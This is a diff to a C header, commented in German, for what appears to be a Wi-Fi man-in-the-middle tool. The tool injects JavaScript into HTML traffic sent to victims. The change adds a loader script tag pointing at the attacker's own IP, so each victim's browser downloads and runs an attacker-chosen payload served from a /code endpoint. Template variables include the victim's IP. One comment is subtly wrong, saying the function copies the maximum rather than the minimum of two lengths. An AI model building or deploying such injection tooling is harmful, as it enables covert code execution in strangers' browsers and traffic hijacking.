@@ -11,16 +11,24 @@ extern "C" {
 void wlan_html_inject_set_armed(bool armed);
 bool wlan_html_inject_armed(void);
 
-/** Inject-Payload setzen. NUL-terminierter String, max 256 Bytes inkl. NUL.
- *  Wirkt sofort auf alle folgenden Pakete. Bei sehr langem Code greift der
- *  Inject seltener (Headroom im Buffer / Whitespace ums <meta>-Tag reicht nicht
- *  mehr). Default beim Init: "<script>alert(1234);</script>".
- *  Unterstützt Template-Variablen, die pro Paket aufgelöst werden:
- *    %%MY_IP%%      — eigene IP des MiTM (vom Setter)
- *    %%VICTIM_IP%%  — IP des Opfers (Empfänger des Pakets)
- *    %%HOST%%       — letzter HTTP Host-Header (Per-Flow-Lookup)
- *    %%PATH%%       — letzter URL-Pfad */
+/** User-Payload setzen — rohes JS (kein <script>-Wrapper nötig). Wird beim
+ *  HTTP-GET /code an den Browser ausgeliefert. Der eigentliche Inject in jedes
+ *  HTML-Response-Paket ist dagegen ein winziger Loader
+ *    <script src="//<MY_IP>/code"></script>
+ *  der den hier gesetzten Code dann in der Browser-Sandbox holt. Damit passt
+ *  der Inject auch bei beengten <body>-Slots, und der eigentliche Payload
+ *  darf beliebig groß werden (max 1023 Bytes).
+ *
+ *  Im Payload können Template-Variablen stehen, die der /code-Endpoint pro
+ *  Request rendert:
+ *    %%MY_IP%%      — eigene IP des MiTM
+ *    %%VICTIM_IP%%  — IP des Browsers, der /code abruft */
 void wlan_html_inject_set_code(const char* code);
+
+/** Liest den aktuell gesetzten User-Payload in `out` (NICHT NUL-terminiert).
+ *  Kopiert max(actual_len, max_len) Bytes; Rückgabe ist die geschriebene Länge.
+ *  Vom mitm-server /code-Handler aufgerufen. */
+uint32_t wlan_html_inject_get_payload(char* out, uint32_t max_len);
 
 /** Eigene IP für die %%MY_IP%%-Variable setzen (host byte order = wie
  *  wlan_hal_get_own_ip() liefert). Sollte in der Run-Scene beim Arm gesetzt
